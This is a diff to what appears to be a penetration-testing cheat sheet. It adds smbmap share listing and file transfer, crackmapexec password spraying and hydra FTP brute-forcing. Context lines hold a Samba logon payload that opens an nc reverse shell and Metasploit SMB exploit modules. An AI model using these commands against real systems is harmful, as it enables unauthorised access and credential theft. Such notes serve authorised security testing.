@@ -232,6 +232,9 @@ $ smbclient \\\\<IP address>\\c$ -U <username>
 $ smbclient //<IP address>/<share> -k -c ls -no-pass
 $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
+$ smbmap -H <IP address> -r <share name>
+$ smbmap -H <IP address> --download "<share name>\file.txt"
+$ smbmap -H <IP address> --upload test.txt "<share name>\file.txt"
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
 smb: \> !ls
 $ rpcclient -U "" <IP address>
@@ -246,9 +249,10 @@ msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
 msf> use exploit/windows/smb/psexec
 $ enum4linux -a <IP address>
-$ enum4linux-ng.py -A <IP address>
+$ enum4linux-ng.py -A -C <IP address>
 $ crackmapexec smb <IP address> --shares
 $ crackmapexec smb <IP address> --shares -u '' -p ''
+$ crackmapexec smb <IP address> -u <usernames.txt> -p '<password>'
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec winrm <IP address> -u <username> -p '<password>'
 ```
@@ -1129,6 +1133,7 @@ $ john --show hash.txt
 # Upgrade hydra if any errors
 $ hydra -l '<username>' -p '<password>' <IP address> ssh
 $ hydra -L <usernames.txt> -P <passwords.txt> ssh://<IP address>
+$ hydra -L <usernames.txt> -P <passwords.txt> ftp://<IP address>
 $ hydra -L <usernames.txt> -P <passwords.txt> rdp://<IP address>
 $ hydra -L <usernames.txt> -P <passwords.txt> smb://<IP address>
 $ hydra -C <user_pass.txt> ssh://<IP address>
